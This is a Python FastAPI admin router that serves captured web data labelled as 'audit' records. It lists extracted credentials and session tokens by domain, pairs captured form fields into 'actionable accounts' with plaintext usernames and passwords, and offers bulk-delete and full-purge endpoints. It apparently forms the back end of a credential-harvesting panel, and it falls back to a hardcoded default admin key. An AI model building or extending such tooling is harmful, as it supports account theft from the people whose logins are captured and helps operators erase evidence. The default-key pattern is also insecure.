from fastapi import APIRouter, HTTPException, Query, Depends, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from typing import Optional, List
import os
import logging
from utils.supabase_client import supabase_audit

router = APIRouter(
    prefix="/v1/admin",
    tags=["admin"]
)

logger = logging.getLogger("admin")
security = HTTPBearer()

def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Very simple token validation against env variable."""
    expected_key = os.getenv("ADMIN_API_KEY", "admin_secret_key_123")
    if credentials.credentials != expected_key:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or missing API Key",
            headers={"WWW-Authenticate": "Bearer"},
        )
    return credentials.credentials

@router.get("/verify")
async def verify_auth(token: str = Depends(verify_token)):
    """Check if the provided token is valid."""
    return {"status": "authorized"}

@router.get("/captures")
async def list_captures(
    page: int = Query(1, ge=1),
    page_size: int = Query(20, ge=1, le=100),
    domain: Optional[str] = None,
    capture_type: Optional[str] = None,
    search: Optional[str] = None,
    token: str = Depends(verify_token)
):
    """List audit captures with pagination and advanced filtering."""
    try:
        start = (page - 1) * page_size
        end = start + page_size - 1

        query = supabase_audit.table("audit_captures").select("*", count="exact").order("timestamp", desc=True).range(start, end)
        
        if domain:
            query = query.ilike("domain", f"%{domain}%")
        
        if capture_type and capture_type != "ALL":
            # Map G100 to HEADER_CAPTURE if DB enum isn't updated
            db_type = "HEADER_CAPTURE" if capture_type == "G100" else capture_type
            query = query.eq("capture_type", db_type)
            
        if search:
            # Simple OR logic using Supabase filter string if needed, 
            # but usually just domain filtering is enough for the search box
            query = query.or_(f"domain.ilike.%{search}%,url.ilike.%{search}%")

        response = query.execute()
        
        return {
            "data": response.data,
            "total": response.count,
            "page": page,
            "page_size": page_size
        }
    except Exception as e:
        logger.error(f"ADMIN_GET_CAPTURES_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/credentials")
async def list_credentials(
    page: int = Query(1, ge=1),
    page_size: int = Query(50, ge=1, le=200),
    domain: Optional[str] = None,
    capture_type: Optional[str] = None,
    search: Optional[str] = None,
    token: str = Depends(verify_token)
):
    """List extracted credentials with pagination and filtering."""
    try:
        start = (page - 1) * page_size
        end = start + page_size - 1

        query = supabase_audit.table("extracted_credentials").select("*", count="exact").order("timestamp", desc=True).range(start, end)
        
        if domain:
            query = query.ilike("domain", f"%{domain}%")
            
        if capture_type and capture_type != "ALL":
            # Map G100 to HEADER_CAPTURE if DB enum isn't updated
            db_type = "HEADER_CAPTURE" if capture_type == "G100" else capture_type
            query = query.eq("capture_type", db_type)
            
        if search:
            query = query.or_(f"domain.ilike.%{search}%,field_value.ilike.%{search}%,field_name.ilike.%{search}%")

        response = query.execute()
        
        return {
            "data": response.data,
            "total": response.count,
            "page": page,
            "page_size": page_size
        }
    except Exception as e:
        logger.error(f"ADMIN_GET_CREDS_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/accounts")
async def list_accounts(
    page: int = Query(1, ge=1),
    page_size: int = Query(50, ge=1, le=200),
    domain: Optional[str] = None,
    search: Optional[str] = None,
    token: str = Depends(verify_token)
):
    """
    Correlates extracted fields into actionable accounts.
    Groups fields by audit_capture_id and identifies user/pass pairs.
    """
    try:
        # 1. Fetch credentials with base filters
        query = supabase_audit.table("extracted_credentials").select("*").order("timestamp", desc=True)
        
        if domain:
            query = query.ilike("domain", f"%{domain}%")
        if search:
            query = query.or_(f"domain.ilike.%{search}%,field_value.ilike.%{search}%")
            
        # For simplicity in this specialized view, we fetch a larger window and aggregate in memory
        # since SQL grouping for pivoting is complex in Supabase-py without raw RPCs.
        response = query.execute()
        
        if not response.data:
            return {"data": [], "total": 0}

        # 2. Correlate fields by capture_id
        grouped = {}
        for cred in response.data:
            cid = cred["audit_capture_id"]
            if cid not in grouped:
                grouped[cid] = {
                    "id": cid,
                    "domain": cred["domain"],
                    "timestamp": cred["timestamp"],
                    "url": cred["url"],
                    "fields": {},
                    "is_account": False
                }
            
            name = cred["field_name"].lower()
            val = cred["field_value"]
            grouped[cid]["fields"][name] = val
            
            # Heuristic for identifying "accounts"
            user_keys = ['user', 'email', 'login', 'id', 'account', 'phone']
            pass_keys = ['pass', 'pwd', 'secret']
            
            # If we haven't confirmed it's an account yet, check if this field looks like a password
            if not grouped[cid]["is_account"]:
                has_pass = any(pk in name for pk in pass_keys)
                has_user = any(uk in name for uk in user_keys)
                if has_pass:
                    grouped[cid]["is_account"] = True

        # 3. Flatten and filter for display
        accounts = []
        for cid, data in grouped.items():
            # Only include if it has at least one field (and ideally is an "account")
            # We can expose all grouped data but prioritize user/pass identification
            
            # Simple heuristic for "user" and "pass" identification for the list view
            display_user = "Unknown"
            display_pass = "********"
            
            for k, v in data["fields"].items():
                if any(pk in k for pk in ['pass', 'pwd']):
                    display_pass = v
                elif any(uk in k for uk in ['user', 'email', 'login']):
                    display_user = v

            accounts.append({
                "capture_id": data["id"],
                "domain": data["domain"],
                "timestamp": data["timestamp"],
                "url": data["url"],
                "user": display_user,
                "password": display_pass,
                "all_fields": data["fields"]
            })

        # 4. Handle pagination for the aggregated list
        start = (page - 1) * page_size
        end = start + page_size
        paginated_accounts = accounts[start:end]

        return {
            "data": paginated_accounts,
            "total": len(accounts),
            "page": page,
            "page_size": page_size
        }
    except Exception as e:
        logger.error(f"ADMIN_GET_ACCOUNTS_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.delete("/captures/{capture_id}")
async def delete_capture(capture_id: str, token: str = Depends(verify_token)):
    """Delete a specific capture record."""
    try:
        # Check if record exists
        check = supabase_audit.table("audit_captures").select("id").eq("id", capture_id).execute()
        if not check.data:
            raise HTTPException(status_code=404, detail="Capture not found")

        # Delete from relational tables first if no cascade
        supabase_audit.table("extracted_credentials").delete().eq("audit_capture_id", capture_id).execute()
        supabase_audit.table("session_tokens").delete().eq("audit_capture_id", capture_id).execute()
        
        # Delete main record
        response = supabase_audit.table("audit_captures").delete().eq("id", capture_id).execute()
        
        return {"status": "success", "message": f"Capture {capture_id} deleted"}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"ADMIN_DELETE_CAPTURE_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/captures/bulk-delete")
async def bulk_delete_captures(payload: dict, token: str = Depends(verify_token)):
    """Delete multiple capture records in one go."""
    try:
        capture_ids = payload.get("ids", [])
        if not capture_ids:
            return {"status": "skipped", "message": "No IDs provided"}

        # Batch delete from relational tables
        supabase_audit.table("extracted_credentials").delete().in_("audit_capture_id", capture_ids).execute()
        supabase_audit.table("session_tokens").delete().in_("audit_capture_id", capture_ids).execute()
        
        # Batch delete main records
        response = supabase_audit.table("audit_captures").delete().in_("id", capture_ids).execute()
        
        return {"status": "success", "message": f"Deleted {len(capture_ids)} records"}
    except Exception as e:
        logger.error(f"ADMIN_BULK_DELETE_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.delete("/purge")
async def purge_all_data(token: str = Depends(verify_token)):
    """High-security deletion of ALL captured data across all tables."""
    try:
        # Delete from relational tables first
        # We use a broad delete without filter to wipe everything (requires 'allow_empty_filters' or equivalent, 
        # but in Supabase-py it's usually eq("id", "*") or a filter that always matches, 
        # or better yet, if the table has captured_id, we can just delete().neq("id", "00000000-0000-0000-0000-000000000000"))
        
        # Wiping credentials
        supabase_audit.table("extracted_credentials").delete().neq("id", 0).execute()
        # Wiping tokens
        supabase_audit.table("session_tokens").delete().neq("id", 0).execute()
        # Wiping main captures
        supabase_audit.table("audit_captures").delete().neq("domain", "null").execute()
        
        return {"status": "success", "message": "All database records have been purged"}
    except Exception as e:
        logger.error(f"ADMIN_PURGE_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))

@router.patch("/credentials/{cred_id}")
async def update_credential(cred_id: int, updates: dict, token: str = Depends(verify_token)):
    """Update field values in extracted credentials."""
    try:
        # Only allow updating specific fields
        allowed_fields = ["field_name", "field_value", "field_type"]
        filtered_updates = {k: v for k, v in updates.items() if k in allowed_fields}
        
        if not filtered_updates:
            raise HTTPException(status_code=400, detail="No valid fields to update")

        response = supabase_audit.table("extracted_credentials").update(filtered_updates).eq("id", cred_id).execute()
        
        if not response.data:
            raise HTTPException(status_code=404, detail="Credential record not found")
            
        return {"status": "success", "data": response.data[0]}
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"ADMIN_PATCH_CRED_ERROR: {str(e)}")
        raise HTTPException(status_code=500, detail=str(e))
